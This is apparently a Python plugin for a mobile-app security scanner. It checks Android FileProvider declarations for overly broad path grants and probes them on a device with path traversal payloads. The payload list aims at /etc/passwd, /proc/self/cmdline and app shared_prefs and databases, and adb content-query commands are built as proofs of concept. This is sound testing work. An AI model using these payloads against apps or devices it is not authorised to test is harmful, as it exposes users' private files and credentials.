"""FileProviderPlugin — test FileProvider configurations for path traversal and overly permissive grants."""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

from backend.plugins.base import (
    BasePlugin,
    PluginCategory,
    PluginFinding,
    PoC,
)

if TYPE_CHECKING:
    from backend.core.device_manager import DeviceHandle
    from backend.core.apk_analyzer import APKAnalysis


_PATH_TRAVERSAL_PAYLOADS = [
    "../",
    "../../",
    "../../../",
    "..%2f",
    "..%252f",
    "....//",
    "..\\",
    "%2e%2e%2f",
    "../../../etc/passwd",
    "../../../proc/self/cmdline",
    "../../../data/data/{pkg}/shared_prefs/",
    "../../../data/data/{pkg}/databases/",
]

_SENSITIVE_PATHS = [
    "root-path",     # / — entire filesystem
    "files-path",    # internal files
    "cache-path",    # internal cache
    "external-path", # external storage root
    "external-files-path",
    "external-cache-path",
    "external-media-path",
]

_OVERLY_PERMISSIVE = {
    "root-path": ("critical", "Grants access to the entire filesystem root (/)"),
    "external-path": ("high", "Grants access to all of external storage"),
}

_FILE_PROVIDER_RE = re.compile(
    r'<provider[^>]+android:name\s*=\s*"([^"]*FileProvider[^"]*)"[^>]*'
    r'android:authorities\s*=\s*"([^"]*)"',
    re.DOTALL | re.IGNORECASE,
)

_FILE_PROVIDER_ALT_RE = re.compile(
    r'<provider[^>]+android:authorities\s*=\s*"([^"]*)"[^>]*'
    r'android:name\s*=\s*"([^"]*FileProvider[^"]*)"',
    re.DOTALL | re.IGNORECASE,
)

_PATH_XML_RE = re.compile(
    r'<(root-path|files-path|cache-path|external-path|external-files-path|'
    r'external-cache-path|external-media-path)\s+[^/]*/\s*>',
    re.IGNORECASE,
)

_PATH_DETAIL_RE = re.compile(
    r'<(\w+-path)\s+name\s*=\s*"([^"]*)"\s+path\s*=\s*"([^"]*)"\s*/\s*>',
    re.IGNORECASE,
)


class FileProviderPlugin(BasePlugin):
    name = "file_provider"
    display_name = "FileProvider Tester"
    description = (
        "Tests FileProvider configurations. Reads file_provider_paths.xml. "
        "Tests path traversal via content:// URIs. Checks for overly permissive grants."
    )
    version = "1.0.0"
    category = PluginCategory.SCANNER
    requires_device = True
    attack_vectors = [
        "file_provider_traversal",
        "overly_permissive_path",
        "file_provider_data_leak",
    ]

    async def run(self, analysis, device, progress_callback=None) -> list[PluginFinding]:
        findings: list[PluginFinding] = []
        pkg = analysis.package_name
        manifest = analysis.manifest_raw

        # 1) Find FileProvider declarations
        authorities = self._extract_authorities(manifest)
        if not authorities:
            return findings

        # 2) Parse file_provider_paths.xml from manifest metadata
        path_configs = self._parse_path_configs(manifest)

        # 3) Static: check for overly permissive paths
        for path_type, name, path_val in path_configs:
            if path_type in _OVERLY_PERMISSIVE:
                severity, desc = _OVERLY_PERMISSIVE[path_type]
                findings.append(PluginFinding(
                    title=f"Overly permissive FileProvider path: {path_type} — {name}",
                    description=(
                        f"FileProvider declares <{path_type} name=\"{name}\" "
                        f"path=\"{path_val}\">. {desc}. Any app granted "
                        f"temporary URI permission can access files under this path."
                    ),
                    severity=severity,
                    component_type="provider",
                    cvss_score=9.0 if severity == "critical" else 7.5,
                    cwe_id="CWE-732",
                    mstg_id="MSTG-STORAGE-6",
                    owasp_mobile="M2",
                    evidence={
                        "path_type": path_type,
                        "name": name,
                        "path": path_val,
                    },
                ))

            # Check if path is "." (everything under that root)
            if path_val == "." or path_val == "/" or path_val == "":
                findings.append(PluginFinding(
                    title=f"FileProvider path grants entire directory: {path_type}/{name}",
                    description=(
                        f"FileProvider declares <{path_type} name=\"{name}\" "
                        f"path=\"{path_val}\">. Path '.' or empty grants access "
                        f"to the entire directory for this path type."
                    ),
                    severity="medium",
                    component_type="provider",
                    cwe_id="CWE-732",
                    mstg_id="MSTG-STORAGE-6",
                    owasp_mobile="M2",
                    evidence={"path_type": path_type, "name": name, "path": path_val},
                ))

        # 4) Dynamic: path traversal tests on device
        if device:
            for authority in authorities:
                traversal_findings = await self._test_path_traversal(
                    device, authority, path_configs, pkg,
                )
                findings.extend(traversal_findings)

                # 5) Try to read known files via FileProvider
                read_findings = await self._test_known_files(
                    device, authority, path_configs, pkg,
                )
                findings.extend(read_findings)

        if progress_callback:
            await progress_callback(
                plugin=self.name,
                progress=1.0,
                message="FileProvider analysis complete",
            )

        return findings

    # ------------------------------------------------------------------
    def _extract_authorities(self, manifest: str) -> list[str]:
        authorities = []
        for m in _FILE_PROVIDER_RE.finditer(manifest):
            authorities.append(m.group(2))
        for m in _FILE_PROVIDER_ALT_RE.finditer(manifest):
            authorities.append(m.group(1))
        return list(set(authorities))

    def _parse_path_configs(self, manifest: str) -> list[tuple[str, str, str]]:
        """Extract (path_type, name, path) from file_provider_paths.xml embedded in manifest."""
        configs: list[tuple[str, str, str]] = []
        for m in _PATH_DETAIL_RE.finditer(manifest):
            configs.append((m.group(1), m.group(2), m.group(3)))
        # If no detailed matches, look for basic path declarations
        if not configs:
            for m in _PATH_XML_RE.finditer(manifest):
                configs.append((m.group(1), "unnamed", "."))
        return configs

    async def _test_path_traversal(self, device, authority, path_configs, pkg) -> list[PluginFinding]:
        results: list[PluginFinding] = []

        # For each declared path name, try traversal
        names = [cfg[1] for cfg in path_configs] or ["root", "files", "cache"]

        for name in names:
            for payload in _PATH_TRAVERSAL_PAYLOADS:
                if self.is_cancelled:
                    return results
                payload_filled = payload.replace("{pkg}", pkg)
                uri = f"content://{authority}/{name}/{payload_filled}"

                await device.clear_logcat()
                out = await device.content_query(uri)
                logcat = await device.logcat_snapshot(lines=100)

                # Check if we got file content instead of error
                if out and all(err not in out for err in
                               ("SecurityException", "FileNotFoundException",
                                "IllegalArgumentException", "No result found", "Error")):
                    if any(kw in out.lower() for kw in ("root:", "<?xml", "password", "/bin/")):
                        results.append(PluginFinding(
                            title=f"FileProvider path traversal — {authority}/{name}",
                            description=(
                                f"Path traversal via content://{authority}/{name}/ "
                                f"with payload '{payload_filled}' returns file content."
                            ),
                            severity="critical",
                            component_type="provider",
                            cvss_score=9.1,
                            cwe_id="CWE-22",
                            mstg_id="MSTG-STORAGE-6",
                            owasp_mobile="M2",
                            poc_command=f'adb shell content query --uri "content://{authority}/{name}/{payload_filled}"',
                            response_data=out[:2000],
                        ))
                        return results  # confirmed
        return results

    async def _test_known_files(self, device, authority, path_configs, pkg) -> list[PluginFinding]:
        """Try reading known sensitive files through the FileProvider."""
        results: list[PluginFinding] = []
        targets = [
            ("root", "etc/passwd"),
            ("root", "data/data/{pkg}/shared_prefs/"),
            ("files", "shared_prefs"),
            ("files", "databases"),
            ("cache", "."),
            ("external", "Android/data/{pkg}/"),
        ]

        for name, file_path in targets:
            if self.is_cancelled:
                return results
            path = file_path.replace("{pkg}", pkg)
            uri = f"content://{authority}/{name}/{path}"
            out = await device.content_query(uri)

            if out and "SecurityException" not in out and "Error" not in out:
                if "No result found" not in out:
                    results.append(PluginFinding(
                        title=f"FileProvider data access: {name}/{path}",
                        description=(
                            f"Successfully queried content://{authority}/{name}/{path}. "
                            f"FileProvider exposes sensitive files."
                        ),
                        severity="high",
                        component_type="provider",
                        cvss_score=7.5,
                        cwe_id="CWE-200",
                        mstg_id="MSTG-STORAGE-6",
                        owasp_mobile="M2",
                        poc_command=f'adb shell content query --uri "{uri}"',
                        response_data=out[:2000],
                    ))
        return results

    async def generate_poc(self, finding: PluginFinding) -> PoC | None:
        if finding.poc_command:
            return PoC(
                poc_type="adb_command",
                commands=[finding.poc_command],
                expected_result="File content returned through FileProvider",
            )
        return None
